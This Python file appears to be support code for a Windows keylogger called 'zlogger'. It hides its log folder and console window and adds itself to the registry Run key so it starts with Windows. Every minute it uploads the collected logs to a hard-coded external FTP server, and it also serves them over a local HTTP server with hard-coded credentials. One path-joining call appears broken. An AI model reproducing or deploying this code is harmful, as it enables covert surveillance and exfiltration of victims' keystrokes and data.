import socket
import os
import datetime
import netifaces
import winreg
import time
import win32console
import win32gui
from sync_ftp import SyncFtp
import http.server
import base64
import socketserver
import platform

# get the user name as identifier
def user_name():
    user_name = str(socket.gethostname())
    return user_name

# get the current date and time as a string
def current_time():
    current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
    return current_time

#For creating app dir
def dir_path():
    home_path = os.path.expanduser("~")
    dir_name = "zlogger"
    app_root = os.path.join(home_path, dir_name)
    dir_path = os.path.join(app_root, user_name())
    if not os.path.exists(dir_path):
        os.makedirs(dir_path)
    os.chdir(dir_path)
    os.system(f"attrib +h /s /d {app_root}") 
    return dir_path

import win32con

# #this hide function help to minimize the console
def hide_console():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,win32con.SW_HIDE)
    return True

def add_startup():
    # in python __file__ is the instant of file path where it was executed
    pth = os.path.dirname(os.path.realpath(__file__))
    # name of the python file with extension
    s_name="zlogger.py"    
    # joins the file name to end of path address
    address=os.join(pth,s_name) 
    # key we want to change is HKEY_CURRENT_USER  key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    # open the key to make changes to
    open = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)
    # modify the opened key
    winreg.SetValueEx(open,"zlogger",0,winreg.REG_SZ,address)
    # now close the opened key
    winreg.CloseKey(open)

# check if internet is connected or not
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False
    
# Define a function to get the name of an interface from its GUID
def get_interface_name(guid):
    # Open the registry key that contains the mapping
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    # Try to get the subkey that corresponds to the GUID
    try:
        subkey = winreg.OpenKey(key, guid + r'\Connection')
        # Try to get the value that contains the name
        try:
            name = winreg.QueryValueEx(subkey, 'Name')[0]
            # Return the name
            return name
        except FileNotFoundError:
            # If the value is not found, return None
            return None
    except FileNotFoundError:
        # If the subkey is not found, return None
        return None

#Getting current active network interface
def active_interface():
    if(platform.system() == "Windows"):
        active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
    else:
        active_interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    return active_interface

# Upload log directory to ftp server
def sync():
    home_path = os.path.expanduser("~")
    dir_list = os.listdir(home_path)
    if "zlogger" in dir_list:
        source_path = os.path.join(home_path, "zlogger")
        target_path = "/var/www/html/"
    SYNC = SyncFtp("20.124.217.64", "zlogger", "zlogger")
    while True:
        if is_connected() == True:
            try:
                SYNC.send_to_ftp(source_path, target_path)
            except KeyboardInterrupt:
                exit(0)
        time.sleep(60)

#Creating local server
class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        auth_header = self.headers.get("Authorization")
        if auth_header is None:
            self.send_response(401)
            self.send_header("WWW-Authenticate", "Basic realm=\"Test\"")
            self.end_headers()
            return
        auth_parts = auth_header.split()
        if len(auth_parts) != 2 or auth_parts[0] != "Basic":
            self.send_error(400, "Bad request")
            return
        username, password = base64.b64decode(auth_parts[1]).decode().split(":")
        if username != "zlogger" or password != "zlogger":
            self.send_error(403, "Forbidden")
            return
        super().do_GET()

def server():
    PORT = 8000
    DIRECTORY = "./"
    with socketserver.TCPServer(("", PORT), AuthHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            exit(0)
